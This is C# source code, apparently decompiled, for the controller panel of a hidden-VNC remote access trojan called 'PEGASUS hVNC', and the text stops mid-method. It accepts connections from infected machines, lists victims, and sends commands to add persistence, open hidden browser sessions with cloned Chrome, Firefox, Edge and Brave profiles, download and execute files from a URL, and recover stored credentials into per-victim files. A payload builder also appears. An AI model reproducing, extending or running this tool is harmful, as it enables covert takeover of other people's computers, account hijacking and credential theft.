using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using HVNC;
using Microsoft.VisualBasic.CompilerServices;
using PEGASUS;
using PEGASUS.Design.PEGASUS.PEGASUS_HVNC;

namespace PEGASUS_LIME.Design
{
	public class PEGASUS : Form
	{
		public static List<TcpClient> _clientList;

		public static TcpListener _TcpListener;

		private Thread VNC_Thread;

		public static int SelectClient;

		public static bool bool_1;

		public static int int_2;

		public static string isadmin;

		public static string detecav;

		public static Random random = new Random();

		public static string PEGASUSRecoveryResults;

		public int count;

		public static bool ispressed = false;

		public static string userFame = Environment.UserName;

		private IContainer components;

		private ToolStripMenuItem HVNCListenBtn;

		private ToolStripMenuItem portToolStripMenuItem;

		private ToolStripTextBox HVNCListenPort;

		private ToolStripSeparator toolStripSeparator3;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2ControlBox guna2ControlBox3;

		private Guna2ControlBox guna2ControlBox2;

		private Label label1;

		private Label label2;

		private Guna2PictureBox guna2PictureBox1;

		private Label label8;

		public Guna2ToggleSwitch chkSounds;

		private Label Listener;

		private Label label5;

		private Label label6;

		private Label label9;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		public StatusStrip statusStrip1;

		private ToolStripStatusLabel ClientsOnline;

		public Guna2ToggleSwitch StartPort;

		private Label label12;

		private Label label13;

		private Guna2NumericUpDown ListenPort;

		private ImageList imageList1;

		private Guna2DragControl guna2DragControl1;

		private ImageList imageList2;

		private ToolStripMenuItem toolStripMenuItem2;

		private ToolStripMenuItem visitURL;

		private ToolStripMenuItem killChrome;

		private ToolStripMenuItem resetScale;

		private ToolStripMenuItem toolStripMenuItem6;

		private ToolStripMenuItem fromURL;

		private ToolStripMenuItem StartHvnc;

		private ToolStripMenuItem Recover;

		public ListView HVNCList;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader2;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		private ColumnHeader columnHeader7;

		private ColumnHeader columnHeader6;

		private ColumnHeader columnHeader8;

		private ColumnHeader columnHeader9;

		private ColumnHeader columnHeader10;

		private Guna2VScrollBar guna2VScrollBar1;

		private ToolStripMenuItem builderToolStripMenuItem;

		private ToolStripMenuItem hVNCCToolStripMenuItem;

		private ToolStripMenuItem aDDPERSISTENCEToolStripMenuItem;

		private ToolStripMenuItem uNINSTALLToolStripMenuItem1;

		private ToolStripMenuItem rEMOVEPERSISTENCEToolStripMenuItem;

		private ToolStripMenuItem aDDPERSISTENCEToolStripMenuItem1;

		private System.Windows.Forms.Timer timer1;

		private ToolStripMenuItem hRDPToolStripMenuItem;

		private ToolStripMenuItem iNSTALLToolStripMenuItem;

		private ToolStripMenuItem cOPYPROFILEToolStripMenuItem;

		private ToolStripMenuItem rEMOVEToolStripMenuItem;

		private Guna2PictureBox btnClose;

		public static string saveurl { get; set; }

		public static string MassURL { get; set; }

		public string xxhostname { get; set; }

		public string xxip { get; set; }

		public PEGASUS()
		{
			InitializeComponent();
		}

		private void HVNCListenBtn_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(Listener.Text, "Not Listening", TextCompare: false) == 0)
			{
				Listener.Text = "Listening on " + ListenPort.Text;
				HVNCListenBtn.Image = imageList2.Images[0];
				HVNCListenPort.Enabled = false;
				VNC_Thread = new Thread(Listenning)
				{
					IsBackground = true
				};
				bool_1 = true;
				VNC_Thread.Start();
				return;
			}
			IEnumerator enumerator = null;
			while (true)
			{
				try
				{
					try
					{
						foreach (Form openForm in Application.OpenForms)
						{
							if (openForm.Name.Contains("FrmVNC"))
							{
								openForm.Dispose();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception)
				{
					continue;
				}
				break;
			}
			HVNCListenPort.Enabled = true;
			VNC_Thread.Abort();
			bool_1 = false;
			Listener.Text = "Not Listening";
			HVNCListenBtn.Image = imageList2.Images[1];
			HVNCList.Items.Clear();
			_TcpListener.Stop();
			checked
			{
				int num = _clientList.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					_clientList[i].Close();
				}
				_clientList = new List<TcpClient>();
				int_2 = 0;
				ClientsOnline.Text = "Clients Online: 0";
			}
		}

		private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			HVNCListenBtn.PerformClick();
		}

		private void Listenning()
		{
			checked
			{
				try
				{
					_clientList = new List<TcpClient>();
					_TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(ListenPort.Text));
					_TcpListener.Start();
					_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
				}
				catch (Exception ex)
				{
					try
					{
						if (ex.Message.Contains("aborted"))
						{
							return;
						}
						IEnumerator enumerator = null;
						while (true)
						{
							try
							{
								try
								{
									foreach (Form openForm in Application.OpenForms)
									{
										if (openForm.Name.Contains("FrmVNC"))
										{
											openForm.Dispose();
										}
									}
								}
								finally
								{
									if (enumerator is IDisposable)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							catch (Exception)
							{
								continue;
							}
							break;
						}
						bool_1 = false;
						HVNCListenBtn.Text = "Listen";
						int num = _clientList.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							_clientList[i].Close();
						}
						_clientList = new List<TcpClient>();
						int_2 = 0;
						_TcpListener.Stop();
						ClientsOnline.Text = "Clients Online: 0";
					}
					catch (Exception)
					{
					}
				}
			}
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat("0123456789", length)
				select s[random.Next(s.Length)]).ToArray());
		}

		public void ResultAsync(IAsyncResult iasyncResult_0)
		{
			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
			}
			catch (Exception)
			{
			}
		}

		public void ReadResult(IAsyncResult iasyncResult_0)
		{
			TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
			checked
			{
				try
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					byte[] array = new byte[8];
					int num = 8;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = tcpClient.GetStream().Read(array, num2, num);
						num -= num3;
						num2 += num3;
					}
					ulong num4 = BitConverter.ToUInt64(array, 0);
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num5 = 0;
						int num6 = array2.Length;
						while (num6 > 0)
						{
							int num7 = tcpClient.GetStream().Read(array2, num5, num6);
							num6 -= num7;
							num5 += num7;
						}
						memoryStream.Write(array2, 0, (int)num4);
						memoryStream.Position = 0L;
						object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
						if (objectValue is string)
						{
							string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
							try
							{
								if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
								{
									tcpClient.Close();
								}
								if (Operators.CompareString(array3[0], "654321", TextCompare: false) == 0)
								{
									string text;
									try
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									catch
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									try
									{
										string text2 = new Ping().Send(((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address).RoundtripTime.ToString();
										ListViewItem lvi2 = new ListViewItem(new string[10]
										{
											" " + text,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											text2
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										HVNCList.Invoke((ThreadStart)delegate
										{
											lock (_clientList)
											{
												HVNCList.Items.Add(lvi2);
												HVNCList.Items[int_2].Selected = true;
												_clientList.Add(tcpClient);
												int_2++;
												ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
												GC.Collect();
											}
										});
									}
									catch (Exception)
									{
										ListViewItem lvi = new ListViewItem(new string[10]
										{
											" " + text,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											"N/A"
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										HVNCList.Invoke((ThreadStart)delegate
										{
											lock (_clientList)
											{
												HVNCList.Items.Add(lvi);
												HVNCList.Items[int_2].Selected = true;
												_clientList.Add(tcpClient);
												int_2++;
												ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
												GC.Collect();
											}
										});
									}
								}
								else if (_clientList.Contains(tcpClient))
								{
									GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
								}
								else
								{
									tcpClient.Close();
								}
							}
							catch (Exception)
							{
							}
						}
						else if (_clientList.Contains(tcpClient))
						{
							GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
						}
						else
						{
							tcpClient.Close();
						}
						memoryStream.Close();
						memoryStream.Dispose();
					}
					tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				}
				catch (Exception ex3)
				{
					if (!ex3.Message.Contains("disposed"))
					{
						try
						{
							if (_clientList.Contains(tcpClient))
							{
								int NumberReceived;
								for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
								{
									if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
									{
										if (Application.OpenForms[NumberReceived].Visible)
										{
											Invoke((ThreadStart)delegate
											{
												if (Application.OpenForms[NumberReceived].IsHandleCreated)
												{
													Application.OpenForms[NumberReceived].Close();
												}
											});
										}
										else if (Application.OpenForms[NumberReceived].IsHandleCreated)
										{
											Application.OpenForms[NumberReceived].Close();
										}
									}
								}
								HVNCList.Invoke((ThreadStart)delegate
								{
									lock (_clientList)
									{
										try
										{
											int index = _clientList.IndexOf(tcpClient);
											_clientList.RemoveAt(index);
											HVNCList.Items.RemoveAt(index);
											tcpClient.Close();
											int_2--;
											ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
										}
										catch (Exception)
										{
										}
									}
								});
							}
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					tcpClient.Close();
				}
			}
		}

		public void GetStatus(object object_2, TcpClient tcpClient_0)
		{
			FrmV frmV = (FrmV)Application.OpenForms["VNCForm:" + Conversions.ToString(tcpClient_0.GetHashCode())];
			if (!(object_2 is Bitmap))
			{
				if (!(object_2 is string))
				{
					return;
				}
				string[] array = Conversions.ToString(object_2).Split('|');
				string left = array[0];
				if (Operators.CompareString(left, "0", TextCompare: false) == 0)
				{
					frmV.VNCBoxe.Tag = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				}
				if (Operators.CompareString(left, "200", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "201", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated successfully!";
				}
				if (Operators.CompareString(left, "202", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "203", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated successfully!";
				}
				if (Operators.CompareString(left, "204", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Edge initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "205", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Edge initiated successfully!";
				}
				if (Operators.CompareString(left, "206", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Brave initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "207", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
				}
				if (Operators.CompareString(left, "256", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
				}
				if (Operators.CompareString(left, "22", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.int_0 = Conversions.ToInteger(array[1]);
					frmV.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(array[1]);
				}
				if (Operators.CompareString(left, "23", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(array[1]));
				}
				if (Operators.CompareString(left, "24", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = "Copy successfully !";
				}
				if (Operators.CompareString(left, "25", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "26", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				Operators.CompareString(left, "719", TextCompare: false);
				if (Operators.CompareString(left, "2555", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "2556", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "2557", TextCompare: false) == 0)
				{
					frmV.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "3307", TextCompare: false) == 0)
				{
					Clipboard.SetText(array[1].ToString());
				}
				if (Operators.CompareString(left, "3308", TextCompare: false) == 0)
				{
					if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PEGASUSRecovery"))
					{
						Directory.CreateDirectory("PEGASUSRecovery");
					}
					PEGASUSRecoveryResults = array[1].ToString();
					if (!PEGASUSRecoveryResults.Contains("System"))
					{
						File.WriteAllText(Directory.GetCurrentDirectory() + "\\PEGASUSRecovery\\" + xxip + "_" + xxhostname + "_PEGASUSRecovery.txt", PEGASUSRecoveryResults);
					}
					GC.Collect();
				}
			}
			else
			{
				frmV.VNCBoxe.Image = (Image)object_2;
			}
		}

		private void SetLastColumnWidth()
		{
			HVNCList.Columns[HVNCList.Columns.Count - 1].Width = -2;
		}

		private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			e.DrawDefault = true;
		}

		private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			checked
			{
				if (e.Item.Selected)
				{
					e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
					Graphics graphics = e.Graphics;
					string text = e.SubItem.Text;
					Font font = new Font("Electrolize", 9f, FontStyle.Regular, GraphicsUnit.Point);
					int num = e.Bounds.Left + 3;
					int num2 = e.Bounds.Top + 2;
					Point pt = new Point(num, num2);
					Color white = Color.White;
					TextRenderer.DrawText(graphics, text, font, pt, white);
				}
				else
				{
					e.DrawDefault = true;
				}
			}
		}

		private void PEGASUS_Load(object sender, EventArgs e)
		{
			ListenPort.ForeColor = Color.White;
			SetLastColumnWidth();
			HVNCList.Columns[1].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[2].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[3].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[4].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[5].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[6].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[7].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[8].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[9].TextAlign = HorizontalAlignment.Center;
			HVNCList.View = View.Details;
			HVNCList.HideSelection = false;
			HVNCList.OwnerDraw = true;
			HVNCList.BackColor = Color.FromArgb(22, 22, 22);
			HVNCList.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				Brush brush = new SolidBrush(Color.FromArgb(30, 30, 30));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.FromArgb(182, 37, 32));
			};
			HVNCList.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			HVNCList.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			StartPort.Checked = true;
			HVNCListenBtn.PerformClick();
			ClientsOnline.Text = "Clients Online: 0";
			timer1.Enabled = true;
		}

		private void PEGASUS_FormClosed(object sender, FormClosedEventArgs e)
		{
			Environment.Exit(Environment.ExitCode);
		}

		private void StartPort_CheckedChanged(object sender, EventArgs e)
		{
			if (StartPort.Checked)
			{
				ListenPort.Enabled = false;
			}
			else if (!StartPort.Checked)
			{
				ListenPort.Enabled = true;
			}
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			HVNCList.Refresh();
		}

		private void aDDPERSISTENCEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8890* ", (TcpClient)tag);
			}
		}

		private void rEMOVEPERSISTENCEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8891* ", (TcpClient)tag);
			}
		}

		private void visitURL_Click(object sender, EventArgs e)
		{
			try
			{
				if (HVNCList.SelectedItems.Count == 0)
				{
					MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
					return;
				}
				new FrmURL().ShowDialog();
				if (!ispressed)
				{
					return;
				}
				FrmV frmV = new FrmV();
				foreach (object selectedItem in HVNCList.SelectedItems)
				{
					_ = selectedItem;
					count = HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < count; i++)
				{
					frmV.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
					object obj = (frmV.Tag = HVNCList.SelectedItems[i].Tag);
					frmV.hURL(saveurl);
					frmV.Dispose();
				}
				MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
				ispressed = false;
			}
			catch (Exception)
			{
				MsgBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				Close();
			}
		}

		private void killChrome_Click(object sender, EventArgs e)
		{
			FrmV frmV = new FrmV();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmV.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmV.Tag = HVNCList.SelectedItems[i].Tag);
				frmV.KillChrome();
				frmV.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void resetScale_Click(object sender, EventArgs e)
		{
			FrmV frmV = new FrmV();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmV.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmV.Tag = HVNCList.SelectedItems[i].Tag);
				frmV.ResetScale();
				frmV.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void fromURL_Click(object sender, EventArgs e)
		{
			try
			{
				if (HVNCList.SelectedItems.Count == 0)
				{
					MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
					return;
				}
				new FrmMassUpdate().ShowDialog();
				if (!ispressed)
				{
					return;
				}
				FrmV frmV = new FrmV();
				foreach (object selectedItem in HVNCList.SelectedItems)
				{
					_ = selectedItem;
					count = HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < count; i++)
				{
					frmV.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
					object obj = (frmV.Tag = HVNCList.SelectedItems[i].Tag);
					frmV.UpdateClient(MassURL);
					frmV.Dispose();
				}
				MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
				ispressed = false;
			}
			catch (Exception)
			{
				MsgBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				Close();
			}
		}

		private void StartHvnc_Click(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (HVNCList.FocusedItem.Index == -1)
					{
						return;
					}
					for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
					{
						if (Application.OpenForms[i].Tag == _clientList[HVNCList.FocusedItem.Index])
						{
							Application.OpenForms[i].Show();
							return;
						}
					}
					FrmV frmV = new FrmV();
					frmV.Name = "VNCForm:" + Conversions.ToString(_clientList[HVNCList.FocusedItem.Index].GetHashCode());
					frmV.Tag = _clientList[HVNCList.FocusedItem.Index];
					string text = HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
						.Replace("}", null)
						.Replace(":", null)
						.Remove(0, 1);
					string text2 = HVNCList.FocusedItem.SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
						.Replace("}", null)
						.Replace(":", null)
						.Remove(0, 1);
					frmV.Text = text + ":" + text2;
					frmV.ClientRecoveryLabel.Text = text + ":" + text2;
					frmV.Show();
				}
				catch (Exception)
				{
					MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				}
			}
		}

		private void Recover_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			FrmV frmV = new FrmV();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmV.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object tag = HVNCList.SelectedItems[i].Tag;
				string xip = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string xhostname = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				xxip = xip;
				xxhostname = xhostname;
				frmV.xip = xip;
				frmV.xhostname = xhostname;
				frmV.Tag = tag;
				frmV.PEGASUSRecovery();
				frmV.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void builderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			new FrmBuilder(ListenPort.Text).ShowDialog();
		}

		private void hVNCCToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			VNCForm vNCForm = new VNCForm();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				vNCForm.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object tag = HVNCList.SelectedItems[i].Tag;
				HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				vNCForm.Tag = tag;
				vNCForm.Dispose();
			}
			new VNCForm().ShowDialog();
		}

		private void uNINSTALLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8889* ", (TcpClient)tag);
				if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
				{
					break;
				}
				SendTCP("24*", (TcpClient)tag);
				SendTCP("8889* ", (TcpClient)tag);
			}
		}

		private void iNSTALLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8892* ", (TcpClient)tag);
			}
		}

		private void cOPYPROFILEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
